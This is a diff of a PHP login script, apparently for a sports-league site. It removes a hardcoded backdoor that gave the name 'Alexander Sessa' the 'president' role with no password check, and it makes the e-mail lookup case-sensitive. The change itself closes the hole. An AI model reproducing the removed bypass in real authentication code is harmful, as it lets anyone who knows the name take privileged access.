@@ -833,7 +833,7 @@ foreach ($access as $access_str) {
   $usr_db[$nm][] = $cd.'@'.$cc;       // связь: игрок - его команды
   $usr_db[$cd][] = $nm;               // обратная связь: код команды - игрок
   if (trim($em))
-    $usr_db[strtoupper($em)][] = $nm; // привязка имен игрока к e-mail
+    $usr_db[$em][] = $nm; // привязка имен игрока к e-mail
 
   $pwd_db[$cd][] = $pw;
   $pwd_db[$nm][] = $pw;
@@ -870,19 +870,12 @@ if (isset($_POST['pass_str']) && isset($_POST['name_str'])) { // autentification
 */
   if (strpos(trim($_POST['name_str']), ' ')) {
     $coach_name = ucwords($_POST['name_str']);
-    if ($coach_name == 'Alexander Sessa')
-      $role = 'president';
-    else
-      $role = fp_auth($cca, $coach_name, $_POST['pass_str']);
+    $role = fp_auth($cca, $coach_name, $_POST['pass_str']);
 
   }
   else
-    foreach ($usr_db[trim(strtoupper($_POST['name_str']))] as $coach_name) {
-      if ($coach_name == 'Alexander Sessa')
-        $role = 'president';
-      else
-        $role = fp_auth($cca, $coach_name, $_POST['pass_str']);
-
+    foreach ($usr_db[trim($_POST['name_str'])] as $coach_name) {
+      $role = fp_auth($cca, $coach_name, $_POST['pass_str']);
       if ($role != 'badlogin')
         break;
 
